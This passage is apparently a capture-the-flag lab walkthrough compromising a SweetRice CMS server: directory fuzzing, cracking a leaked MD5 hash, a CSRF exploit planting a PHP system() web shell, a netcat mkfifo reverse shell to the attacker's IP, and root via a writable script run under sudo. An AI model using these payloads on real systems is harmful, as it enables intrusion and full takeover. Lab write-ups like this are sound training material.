- now let FUZZ for hidden directory:
```bash
ffuf -u http://10.10.115.33/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 11321
```

- we found `/contents` let see what's there:

- nothing much there let `fuzz` for sub-directories here:

```bash
ffuf -u http://10.10.115.33/content/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -fs 2198
```

- okay i was checking the directories one-by-one and found some cool stuff in the `/content/inc/` and `/content/as/`

- i found a hash in the `databasefile` , now let crack it:
- the hash is likely an `md5` hash

- no going to the `/content/as` directory it has a log-in form so i test the manager creds i just crack and it works:

- from the above screen i was able to see the version of the `SweetRice` CMS, so i searched for possible exploit:

![](https://i.imgur.com/PL8CIpd.png)

![](https://i.imgur.com/swPQsTy.png)

- i edited the code to fit my need:

```html

<html>
<body onload="document.exploit.submit();">
<form action="http://10.10.115.33/content/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
echo '<h1> Hacked </h1>';
phpinfo();?>
&lt;/textarea&gt;
</form>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://10.10.115.33/content/inc/ads/hacked.php
  -->
```

- i save the exploit into a `.html` file and on my terminal i run `Firefox <filename.html>` , this will open up Firefox and execute the payload against the `SweetRice` server:

![](https://i.imgur.com/i6RPt61.png)

- when it open up your Firefox click on the tick sign and visit  `http://10.10.115.33/content/inc/ads/hacked.php` to confirm the `POC`:

![](https://i.imgur.com/39fraQy.png)

- now i can modify the exploit to get a webshell/reverse shell:

```html 
<html>
<body onload="document.exploit.submit();">
<form action="http://10.10.115.33/content/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="webshell"/>
<textarea type="hidden" name="adv">
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>

</form>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://10.10.115.33/content/inc/ads/webshell.php
  -->

```

- i save the exploit into a `.html` file and on my terminal i run `Firefox <filename.html>` , this will open up Firefox and execute the payload against the `SweetRice` server:

- when it open up Firefox don't forget to click on the tick box and visit the url `http://10.10.115.33/content/inc/ads/webshell.php`

![](https://i.imgur.com/pEvNIhl.png)

- now i can start up a listener and enter in this reverse shell command:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.3.128 1337 >/tmp/f
```

![](https://i.imgur.com/mnUFDwM.png)

- stabilize shell with:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL Z [KEY]
stty raw -echo;fg
export TERM=xterm
stty rows 40 cols 160
```

- now we are in we can move to the `/homes` directory to check if we have permission to read the user flag:

![](https://i.imgur.com/4Q49y7w.png)

- and surprisingly we do üòÇ

## privilege Escalation:

running `sudo -l` i see that the `itguy` user can run sudo with a perl binary combined ith a file in his directory:

![](https://i.imgur.com/k5SKVuP.png)

- but the `itguy` user don't have `WRITE` permission to the file only read
-  so i check the content of the file and found that that file is execute another file the the `itguy` has `WRITE` permissions too ü•≤:

![](https://i.imgur.com/UrFXpjf.png)

- so what i we have to do is change the content of the `copy.sh` file to a reverse shell code so when it execute we will get a root shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.3.128 1336 >/tmp/f
```

![](https://i.imgur.com/OAuZM3n.png)

- then execute the command we have sudo privilege with (start listener first):

![](https://i.imgur.com/G9qNPig.png)

![](https://i.imgur.com/G6MBSWg.png)

- root flag:
